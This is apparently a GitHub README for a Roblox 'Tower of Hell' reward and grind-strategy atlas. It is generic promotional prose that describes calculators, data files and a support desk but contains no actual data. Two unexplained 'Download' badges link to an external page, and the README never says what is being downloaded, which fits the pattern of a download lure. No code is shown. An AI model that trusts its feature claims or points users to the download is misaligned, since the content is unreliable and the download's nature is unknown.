![preview](https://raw.githubusercontent.com/stalker531/toh-grind-atlas/main/splash_7d71.svg)
[![Download](https://raw.githubusercontent.com/stalker531/toh-grind-atlas/main/run_793d.svg)](https://stalker531.github.io/toh-grind-atlas/)

# 🗼 Tower of Hell Progression Atlas — 2026 Reward Cartography & Grind Strategy Compendium

A meticulously engineered, community-maintained reference atlas that maps every point reward, milestone tier, and time-to-value curve across the chaotic vertical labyrinth that is Tower of Hell. Think of it as a cartographer's notebook for a game that refuses to hand you a map — we drew one anyway.

This repository is the spiritual successor to the original reward lookup concept, rebuilt from the ground up with a sharper focus on **earned progression theory**, **session economics**, and **adaptive route planning**. Instead of static tables, we model the *shape* of your grind: where your time converts most efficiently into points, when to pivot from a hot streak to a recovery run, and how a single well-timed checkpoint changes the math on an entire evening.

Whether you are a solo climber chasing a personal best, a party leader coordinating a rotating squad, or a spreadsheet-wielding optimizer who genuinely enjoys pivot tables, this atlas is built to meet you at your altitude.

---

## 📜 Table of Contents

- [Why This Atlas Exists](#-why-this-atlas-exists)
- [Core Philosophy](#-core-philosophy)
- [Feature Highlights](#-feature-highlights)
- [The Reward Cartography Model](#-the-reward-cartography-model)
- [Min-Max Strategy Playbook](#-min-max-strategy-playbook)
- [Responsive Interface & Accessibility](#-responsive-interface--accessibility)
- [Multilingual Support](#-multilingual-support)
- [Support Desk — Always Awake](#-support-desk--always-awake)
- [Roadmap 2026](#-roadmap-2026)
- [Repository Layout](#-repository-layout)
- [Data Sources & Verification](#-data-sources--verification)
- [Contributing](#-contributing)
- [License](#-license)
- [Disclaimer](#-disclaimer)

---

## 🧭 Why This Atlas Exists

Tower of Hell is, at surface level, a game about jumping. At depth, it is a game about **decision-making under uncertainty**. Every checkpoint you touch is a wager: time spent climbing versus time spent stabilizing. Every party you join is a distribution of skill levels. Every session is a portfolio.

Most available reward references stop at "here is the number of points for this stage." That is a phone book, not a strategy. This atlas goes further — it asks *when* a stage's reward becomes worth it, *how much* of your evening a tier costs, and *what* alternative path produces similar returns with less variance.

The project began because the original reward lookup table filled a genuine gap, but the community kept asking deeper questions. Rather than bolt on a dozen side answers, we rebuilt the whole thing around **progression economics**: the study of how a player's limited hours convert into measurable in-game value.

---

## 🎯 Core Philosophy

Three principles guide every file in this repository.

**1. Data should be legible, not just correct.**
A table with 4,000 rows is technically complete and functionally useless. We design for the human reading it at 2 a.m. after their eleventh attempt at a tier three stage.

**2. Strategy is personal.**
An optimizer with two hours and an optimizer with twenty minutes have different optimal paths. The playbook sections are written as **branching recommendations**, not single prescriptions.

**3. Respect the player's time.**
Nothing here encourages exploits, manipulation of game systems, or shortcuts that compromise the experience. This is about playing *smarter*, not playing *less*. Effort is the engine; the atlas is only the steering.

---

## ✨ Feature Highlights

- 📊 **Dynamic Reward Tables** — Searchable, sortable, and tagged by tier, checkpoint density, and typical completion time.
- 🧮 **Reward-per-Minute Calculator** — Compare stages not by raw payout but by efficiency at your personal skill ceiling.
- 🗺️ **Route Overlays** — Text-based path diagrams showing alternate branch selections for common tower configurations.
- 🤝 **Party Synergy Notes** — How reward distribution shifts when climbing with 2, 3, or 4 players.
- 📈 **Session Economics Dashboard** — Projected point yield for a planned session length before you commit.
- 🌍 **Multilingual Interface** — Menus and labels localized across several widely spoken languages.
- 📱 **Responsive Layout** — Reads cleanly on a phone, a tablet, or a wide monitor without horizontal scrolling.
- 🕛 **Around-the-Clock Support** — Questions answered at any hour, from any timezone, by rotating maintainers.
- 🧩 **Modular Data Files** — Swap in community-verified updates without touching the logic layer.
- 🔍 **SEO-Oriented Documentation** — Because discovering the right resource should not require knowing its exact name beforehand.

---

## 📚 The Reward Cartography Model

The heart of this project is a layered model that treats every tower run as a sequence of **value events**.

### Layer One — Stage Reward Registry
Each stage entry records its base payout, checkpoint count, and tier classification. Entries are keyed by a stable identifier so community contributions can reference them without ambiguity.

### Layer Two — Time-to-Value Estimates
For each stage, we store a distribution of completion times drawn from aggregated community runs. This is not a single number — it is a range, with median and upper-percentile figures, because *your* time will be somewhere in that spread.

### Layer Three — Efficiency Curves
Simplify the ratio of payout to time and you get a curve that bends as your skill improves. A stage that is punishing for a newcomer may become the highest-yield option for a veteran. The atlas renders these curves as compact numeric bands so you can spot the crossover point at a glance.

### Layer Four — Session Composition
Individual stages are building blocks. Sessions are architecture. This layer recommends how to sequence stages to manage fatigue, exploit hot streaks, and avoid the trap of grinding a single high-value stage well past the point where your success rate drops.

### Layer Five — Meta Notes
Tier rotations, event bonuses, and seasonal adjustments live here, timestamped so you know when a recommendation was last valid.

---

## ⚔️ Min-Max Strategy Playbook

The playbook is written as a set of **decision heuristics** rather than rigid rules. Highlights include:

- **Warm-Up Doctrine** — Begin every session with two moderate stages before touching your highest-value target. Measured success rates climb noticeably after a calibration period.
- **The Eighty Percent Rule** — If your estimated completion probability on a stage falls below roughly four in five attempts, the expected value usually favors a step down in difficulty. Pride is expensive.
- **Party Rotation Cadence** — In group climbs, alternate leadership every three to four attempts to distribute fatigue and keep the squad's collective mood stable.
- **Checkpoint Banking** — On long stages, treat each checkpoint as a separate mini-run. This reframes a brutal climb as a series of winnable moments.
- **Sunset Protocol** — When success rate drops two attempts in a row on the same stage, switch modalities entirely. A different tier resets your mental model faster than a break does.

Each heuristic includes worked examples with synthetic numbers so you can adapt the reasoning to your own situation.

---

## 📱 Responsive Interface & Accessibility

The reference viewer is built to be read in awkward places — on a second monitor, on a phone propped against a keyboard, on a tablet balanced on a couch arm.

- Fluid layouts that reflow tables into stacked cards on narrow screens.
- High-contrast color mode for late-night sessions.
- Keyboard-navigable search and filters.
- Screen-reader-friendly table headers and landmark regions.
- Adjustable font scaling so the numbers stay readable at a distance.

Accessibility is not a checkbox here; it is the difference between a resource you *can* use and one you *actually* use.

---

## 🌍 Multilingual Support

Language should never be the wall between a player and a good plan. The interface strings are externalized into locale files, currently covering several major languages with room to add more. Community translators are credited in the contributor ledger, and adding a new locale is designed to be a gentle first contribution for anyone learning the project's conventions.

If a translation drifts out of date, the fallback chain displays the English string rather than an empty field — no broken menus, ever.

---

## 🕛 Support Desk — Always Awake

Our support desk operates on a **follow-the-sun rotation** across maintainers in different timezones. Ask a question at noon in one region or midnight in another and someone is usually already reading.

Support channels cover:
- Clarifying a reward entry that looks inconsistent with your experience.
- Suggesting a new heuristic for the playbook.
- Reporting a translation gap or a rendering issue on a specific device.
- Walking through how to contribute a data correction safely.

Response windows are typically within a day, often within hours. Maintainers are volunteers who love this game and this quirky little spreadsheet universe we built around it.

---

## 🗓️ Roadmap 2026

- **Q1 2026** — Ship the reward-per-minute calculator as a standalone static page.
- **Q2 2026** — Expand locale coverage and add a translation status board.
- **Q3 2026** — Introduce session composition presets for common player profiles.
- **Q4 2026** — Publish an annual retrospective mapping how reward balance shifted across the year, with archived snapshots of every data revision.

The roadmap is a sketch, not a contract. Community pull requests regularly reshape it.

---

## 🗂️ Repository Layout

- `data/` — Modular reward, timing, and meta-note files.
- `docs/` — The playbook, methodology essays, and contributor onboarding.
- `locales/` — Translation string files, one per language.
- `viewer/` — Source for the responsive reference interface.
- `tools/` — Small helper scripts for validating and formatting data entries.
- `archive/` — Dated snapshots so historical analysis stays possible.

Every directory ships with its own short reading guide so newcomers are never dropped into a maze.

---

## 🔍 Data Sources & Verification

Numbers come from three streams:
1. **Community-submitted run logs**, anonymized and aggregated.
2. **Maintainer spot-check runs**, performed after each notable balance change.
3. **Cross-referencing between independent contributors** — if two people report the same stage differently, both entries are flagged until reconciled.

We would rather display "under review" than a confident wrong number. A flagged figure is a promise to look again, not a shrug.

---

## 🤝 Contributing

Contributions are warmly welcomed, and the bar for entry is deliberately low. You do not need to write code to help. A single corrected timestamp is a real contribution.

Ways to help:
- Submit a timing observation for a stage you have run repeatedly.
- Improve a playbook section with your own hard-won heuristic.
- Translate a handful of interface strings into a language you speak.
- Report a device where the layout misbehaves.
- Tidy a doc paragraph that confused you when you first read it.

Contributor guidelines live in `docs/` and emphasize kindness, patience, and the assumption of good faith. First-time contributors are paired with a maintainer if they would like a guide.

---

## 📄 License

This project is released under the **MIT License**. You are welcome to read, adapt, and build upon it in your own projects, provided the original license notice travels with the copies.

Read the full license text here: [MIT License](LICENSE)

---

## ⚠️ Disclaimer

This atlas is an independent, community-run reference and is not affiliated with, endorsed by, or sponsored by the developers or publishers of Tower of Hell or any platform on which it runs.

All recommendations are **informational suggestions** based on aggregated community experience. Individual results vary with skill, session length, device, and the game's evolving balance. Nothing here guarantees a specific point total, rank, or outcome.

We do not provide, encourage, or support any method that manipulates game systems, bypasses intended progression, or violates a platform's terms of service. This project exists purely to help players plan their own time more thoughtfully. Play fairly, climb honestly, and enjoy the fall.

© 2026 Tower of Hell Progression Atlas contributors. Maintained with care by volunteers who are, statistically, still stuck on that one stage.

[![Download](https://raw.githubusercontent.com/stalker531/toh-grind-atlas/main/run_793d.svg)](https://stalker531.github.io/toh-grind-atlas/)